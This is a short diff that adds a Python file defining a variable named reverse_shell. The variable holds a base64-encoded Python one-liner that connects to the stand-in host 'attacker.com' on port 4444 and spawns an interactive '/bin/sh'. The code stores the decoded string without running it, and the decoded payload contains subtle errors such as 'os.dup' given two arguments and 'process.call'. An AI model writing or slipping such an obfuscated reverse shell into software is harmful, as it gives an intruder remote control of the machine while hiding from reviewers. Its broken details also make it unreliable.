@@ -1,0 +1,6 @@
+import base64
+
+
+reverse_shell = base64.b64decode(
+    "cHl0aG9uIDMtYyAnaW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJ2F0dGFja2VyLmNvbScsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAocy5maWxlbm8oKSwwKTtvcy5kdXAocy5maWxlbm8oKSwwKTtwcm9jZXNzLmNhbGwoWycvYmluL3NoJywnLWknXSkn"
+)
